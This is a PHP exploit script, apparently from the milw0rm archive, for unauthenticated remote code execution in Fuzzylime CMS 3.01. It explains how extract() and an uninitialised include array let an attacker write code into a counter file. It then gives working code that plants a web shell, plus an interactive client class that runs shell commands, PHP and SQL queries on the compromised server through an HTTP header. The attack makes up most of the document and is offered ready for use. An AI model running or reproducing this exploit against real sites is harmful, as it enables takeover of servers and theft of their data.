<?php
##
## Name:       Fuzzylime 3.01 Remote Code Execution Exploit
## Credits:    Charles "real" F. <charlesfol[at]hotmail.fr>
##
## Conditions: None
##
## Greetz:     Inphex, hEEGy and austeN
##
## Explanations
## ************
##
## Ok, so today we will go for a walk in the fuzzylime cms maze ...
## Finding vulns was easy, but finding a no condition vuln was quite
## harder ...
##
## First, we look to the code/content.php file:
##
##---[code/content.php]------------------------------------------
## 02| require_once("code/functions.php");
## --| [...]
## 09| $countfile = "code/counter/${s}_$p.inc.php";
## 10| if(file_exists($countfile)) {
## 11|     $curcount = loadfile($countfile);
## 12| }
## 13| $curcount++;
## 14| if($handle = @fopen($countfile, 'w')) { // Open the file for saving
## 15|     fputs($handle, $curcount);
## 16|     fclose($handle);
## 17| }
##----------------------------------------------------------------
##
## $s, $p, $curcount vars are not initialized, so we can set it if
## register_globals=On.
##
## POC: http://[url]/code/content.php?s=owned&p=owned&curcount=[PHP_SCRIPT]
##
## Note: [C:\]# php -r "$var='abc'; $var++; print $var;"
##       abd
## So the ++ just increment the last string letter position in the alphabet
## a->b, b->c, etc.
##
## Ok, we got remote code exec ... but wait a minute ... no ! require_once()
## requires a file in the code folder, but we are already in this folder ...
## PHP will die (Fatal Error) and our evil code won't be executed.
## And we wanted a no condition exploit, but this vuln needs register_globals
## to be On ...
##
## hum... let's look at other pages: we can find that extract() function is
## pretty often used, and it can simulate register_globals ...
## Now we are looking for a file which uses extract() and which can include
## code/content.php file, and which is in the root path.
##
## And we finally found commsrss.php, which contains:
##
##---[commsrss.php]-----------------------------------------------
## 17| extract($HTTP_POST_VARS); 
## 18| extract($_POST);
## 19| extract($HTTP_GET_VARS); 
## 20| extract($_GET);
## 21| extract($HTTP_COOKIE_VARS); 
## 22| extract($_COOKIE);
## --| [...]
## 64| $dir = "blogs/comments/";
## 65| if($dlist = opendir($dir)) {
## 66|     while (($file = readdir($dlist)) !== false) {
## 67|         if(strstr($file, $p)) {
## 68|             $files[] = $file;
## 69|         }
## 70|     }
## 71|     closedir($dlist);
## 72| }
## 73| for($i = 0; $i < count($files); $i++) {
## 74|     include "blogs/comments/$files[$i]";
## --| [...]
## 89| }
##----------------------------------------------------------------
##
## w00t ! $files array is not initialized ... we can include every
## file we want.
##
## Using chr() we can bypass magic_quotes_gpc=Off [ see chrit() ]
##
## Our problems are solved, we have a Remote Code Execution without
## conditions.
##
## Proof of Concept
## ****************
##
## [C:\]# php exploit.php http://www.target.com/
## [target][cmd]# ls
## blogs_.inc.php
## content_index.inc.php
## content_index.php.inc.php
## content_test.inc.php
## front_index.inc.php
## front_test.inc.php
## index.htm
## index.php_index.inc.php
##
## [target][cmd]# exit
##
## [C:\]# 

$url = $argv[1];


$php_code = '<?php'
          . 'error_reporting(0);'
          . 'print ' . chrit('-:-:-') . ';'.
          . 'eval(stripslashes($_SERVER[HTTP_SHELL]));'
	  . 'print ' . chrit('-:-:-') . ';'.
	  . '?>';

$php_code--; // 13| $curcount++;

$c0de  = $url . 'commsrss.php?s=blogs&m=&usecache=0&files[0]=../../code/content.php'
              . '&curcount=' . urlencode($php_code);

$shell = $url . 'code/counter/blogs_.inc.php';


# Be careful: we can create a valid shell only ONCE.
# So check if it does not already exist before doing
# anything else.
if(status_404($shell)==true)
	get($c0de);

$phpR = new phpreter($shell, '-:-:-(.*)-:-:-', 'cmd', array(), false);

function chrit($str)
{
	$r = '';
	
	for($i=0;$i<strlen($str);$i++)
	{
		$z  = substr($str, $i, 1);
		$r .= '.chr('.ord($z).')';
	}
	
	return substr($r, 1);
}

function get($url)
{
	$infos = parse_url($url);
	$host  = $infos['host'];
	$port  = isset($infos['port']) ? $infos['port'] : 80;
	
	$fp = fsockopen($host, $port, &$errno, &$errstr, 30);
	
	$req  = "GET $url HTTP/1.1\r\n";
	$req .= "Host: $host\r\n";
	$req .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n";
	$req .= "Connection: close\r\n\r\n";

	fputs($fp,$req);
	fclose($fp);
}

function status_404($url)
{
	$infos = parse_url($url);
	$host  = $infos['host'];
	$port  = isset($infos['port']) ? $infos['port'] : 80;
	
	$fp = fsockopen($host, $port, &$errno, &$errstr, 30);
	
	$req  = "GET $url HTTP/1.1\r\n";
	$req .= "Host: $host\r\n";
	$req .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n";
	$req .= "Connection: close\r\n\r\n";

	fputs($fp, $req);
	
	$res = '';
	while(!feof($fp) && !preg_match('#404#', $res))
		$res .= fgets($fp, 1337);
	
	fclose($fp);
	
	if(preg_match('#404#', $res))
		return true;
	
	return false;
}

/*
 * Copyright (c) real
 *
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 * TITLE:          PHPreter
 * AUTHOR:         Charles "real" F. <charlesfol[at]hotmail.fr>
 * VERSION:        1.0
 * LICENSE:        GNU General Public License
 *
 * This is a really simple class with permits to exec SQL, PHP or CMD
 * on a remote host using the HTTP "Shell" header.
 *
 *
 * Sample code:
 * [host][sql]# mode=cmd
 * [host][cmd]# id
 * uid=2176(u47170584) gid=600(ftpusers)
 * 
 * [host][cmd]# mode=php
 * [host][php]# echo phpversion();
 * 4.4.8
 * [host][php]# mode=sql
 * [host][sql]# SELECT version(), user()
 * --------------------------------------------------
 *  version()           | 5.0.51a-log
 *  user()              | dbo225004932@74.208.16.148
 * --------------------------------------------------
 * 
 * [host][sql]#
 *
 */

class phpreter
{
	var $url;
	var $host;
	var $port;
	var $page;
	
	var $mode;
	
	var $ssql;
	
	var $prompt;
	var $phost;
	
	var $regex;
	var $data;
	
	/**
	 * __construct()
	 *
	 * @param url      The url of the remote shell.
	 * @param regexp   The regex to catch cmd result.
	 * @param mode     Mode: php, sql or cmd.
	 * @param sql      An array with the file to include,
	 *                 and sql vars
	 * @param clear    Determines if clear() is called
	 *                 on startup
	 */
	function __construct($url, $regexp='^(.*)$', $mode='cmd', $sql=array(), $clear=true)
	{
		$this->url = $url;
		
		$this->regex = '#'.$regexp.'#is';
		
		#
		# Set data
		#
		
		$infos         =	parse_url($this->url);
		$this->host    =	$infos['host'];
		$this->port    =	isset($infos['port']) ? $infos['port'] : 80;
		$this->page    =	$infos['path'];
		unset($infos);
		
		# www.(site).com
		$host_tmp      =	explode('.',$this->host);
		$this->phost   =	$host_tmp[ count($host_tmp)-2 ];
		unset($host_tmp);
		
		#
		# Set up MySQL connection string
		#
		if(!sizeof($sql))
			$this->ssql = '';
		elseif(sizeof($sql)==5)
		{
			$this->ssql = "include('$sql[0]');"
			            . "mysql_connect($sql[1], $sql[2], $sql[3]);"
				    . "mysql_select_db($sql[4]);";
		}
		else
		{
			$this->ssql = ""
			            . "mysql_connect('$sql[0]', '$sql[1]', '$sql[2]');"
				    . "mysql_select_db('$sql[3]');";
		}
		
		$this->setmode($mode);
		
		#
		# Main Loop
		#

		if($clear) $this->clear();
		print $this->prompt;

		while( !preg_match('#^(quit|exit|close)$#i', ($cmd = trim(fgets(STDIN)))) )
		{
			# change mode
			if(preg_match('#^(set )?mode(=| )(sql|cmd|php)$#i',$cmd,$array))
				$this->setmode($array[3]);
			
			# clear data
			elseif(preg_match('#^clear$#i',$cmd))
				$this->clear();
			
			# else
			else print $this->exec($cmd);
			
			print $this->prompt;
		}
	}
	
	/**
	 * clear()
	 * Just clears ouput, printing '\n'x50
	 */
	function clear()
	{
		print str_repeat("\n", 50);
		return 0;
	}
	
	/**
	 * setmode()
	 * Set mode (PHP, CMD, SQL)
	 * You don't have to call it.
	 * use mode=[php|cmd|sql] instead,
	 * in the prompt.
	 */
	function setmode($newmode)
	{
		$this->mode = strtolower($newmode);
		$this->prompt = '['.$this->phost.']['.$this->mode.']# ';
		
		switch($this->mode)
		{
			case 'cmd':
				$this->data = 'system(\'<CMD>\');';
				break;
			case 'php':
				$this->data = '';
				break;
			case 'sql':
				$this->data = $this->ssql
				            . '$q = mysql_query(\'<CMD>\') or print(str_repeat("-",50)."\n".mysql_error()."\n");'
					    . 'print str_repeat("-",50)."\n";'
					    . 'while($r=mysql_fetch_array($q,MYSQL_ASSOC))'
					    . '{'
					    . 	'foreach($r as $k=>$v) print " ".$k.str_repeat(" ", (20-strlen($k)))."| $v\n";'
					    . 	'print str_repeat("-",50)."\n";'
					    . '}';
				break;
		}
		return $this->mode;
	}

	/**
	 * exec()
	 * Execute any query and catch the result.
	 * You don't have to call it.
	 */
	function exec($cmd)
	{
		if(!strlen($this->data))	$shell = $cmd;
		else                    	$shell = str_replace('<CMD>', addslashes($cmd), $this->data);
		
		$fp = fsockopen($this->host, $this->port, &$errno, &$errstr, 30);
		
		$req  = "GET " . $this->page . " HTTP/1.1\r\n";
		$req .= "Host: " . $this->host . ( $this->port!=80 ? ':'.$this->port : '' ) . "\r\n";
		$req .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n";
		$req .= "Shell: $shell\r\n";
		$req .= "Connection: close\r\n\r\n";
		
		unset($shell);

		fputs($fp, $req);
		
		$content = '';
		while(!feof($fp)) $content .= fgets($fp, 128);
		
		fclose($fp);
		
		# Remove headers
		$data    = explode("\r\n\r\n", $content);
		$headers = array_shift($data);
		$content = implode("\r\n\r\n", $data);
		
		if(preg_match("#Transfer-Encoding:.*chunked#i", $headers))
			$content = $this->unchunk($content);
	
		preg_match($this->regex, $content, $data);
		
		if($data[1][ strlen($data)-1 ] != "\n") $data[1] .= "\n";
		
		return $data[1];
	}
	
	/**
	 * unchunk()
	 * This function aims to remove chunked content sizes which
	 * are putted by apache server when it uses chunked
	 * transfert-encoding.
	 */
	function unchunk($data)
	{
		$dsize  = 1;
		$offset = 0;
		
		while($dsize>0)
		{
			$hsize_size = strpos($data, "\r\n", $offset) - $offset;
			
			$dsize = hexdec(substr($data, $offset, $hsize_size));
			
			# Remove $hsize\r\n from $data
			$data = substr($data, 0, $offset) . substr($data, ($offset + $hsize_size + 2) );
			
			$offset += $dsize;
			
			# Remove the \r\n before the next $hsize
			$data = substr($data, 0, $offset) . substr($data, ($offset+2) );
		}
		
		return $data;
	}
}

?>

# milw0rm.com [2008-07-13]
